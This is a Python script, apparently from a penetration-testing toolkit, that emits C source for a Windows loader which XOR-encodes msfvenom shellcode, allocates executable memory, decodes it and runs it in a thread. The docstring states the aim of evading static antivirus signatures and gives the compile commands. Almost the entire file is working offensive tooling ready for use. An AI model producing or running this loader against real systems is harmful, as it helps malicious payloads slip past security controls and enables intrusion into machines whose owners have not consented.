#!/usr/bin/env python3
"""Emit a Windows XOR-decoder stub around raw msfvenom shellcode.

Reads a raw shellcode file on stdin or at argv[1] and writes a complete
C source to stdout that:
  - stores the shellcode XOR'd with a random 1-byte key,
  - at runtime: VirtualAlloc(RWX) → XOR-decode → execute via a thread.

Compile with:
  x86_64-w64-mingw32-gcc -O2 -s -mwindows loader.c -o loader.exe   # x64
  i686-w64-mingw32-gcc   -O2 -s -mwindows loader.c -o loader.exe   # x86

This is OSEP-starter obfuscation — defeats static signatures on raw
msfvenom shellcode. It does NOT defeat behavior-based AV, AMSI on the
staging call, or EDRs that hook the Win32 APIs below. For hardened
targets, teammates layer syscalls / API hashing / unhooking on top.
"""
from __future__ import annotations

import os
import secrets
import sys
import textwrap
from pathlib import Path


def _choose_key() -> int:
    # Avoid 0x00 (identity) and 0xff (trivial for scanners); otherwise any
    # byte is fine for signature evasion of raw msfvenom bytes.
    while True:
        k = secrets.randbelow(256)
        if k not in (0x00, 0xff):
            return k


def _format_bytes(blob: bytes, per_line: int = 16) -> str:
    chunks = []
    for i in range(0, len(blob), per_line):
        line = ", ".join(f"0x{b:02x}" for b in blob[i:i + per_line])
        chunks.append("    " + line)
    return ",\n".join(chunks)


def main() -> int:
    if len(sys.argv) >= 2 and sys.argv[1] != "-":
        data = Path(sys.argv[1]).read_bytes()
    else:
        data = sys.stdin.buffer.read()
    if not data:
        print("ERROR: empty shellcode input", file=sys.stderr)
        return 2

    key = _choose_key()
    xored = bytes(b ^ key for b in data)

    src = textwrap.dedent(f"""\
        /* PEN-AGENT preflight XOR loader — generated, do not hand-edit.
         * key=0x{key:02x}  len={len(data)}
         */
        #include <windows.h>

        static unsigned char payload[] = {{
        {_format_bytes(xored)}
        }};
        static const unsigned int payload_len = {len(data)};
        static const unsigned char xor_key = 0x{key:02x};

        int main(void) {{
            void *mem = VirtualAlloc(0, payload_len,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);
            if (!mem) return 1;
            for (unsigned int i = 0; i < payload_len; i++) {{
                ((unsigned char *)mem)[i] = payload[i] ^ xor_key;
            }}
            HANDLE th = CreateThread(0, 0,
                                     (LPTHREAD_START_ROUTINE)mem,
                                     0, 0, 0);
            if (!th) return 2;
            WaitForSingleObject(th, INFINITE);
            return 0;
        }}
        """)
    sys.stdout.write(src)
    # Echo the chosen key on stderr so gen_payloads.sh can record it in index.json.
    print(f"KEY=0x{key:02x}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
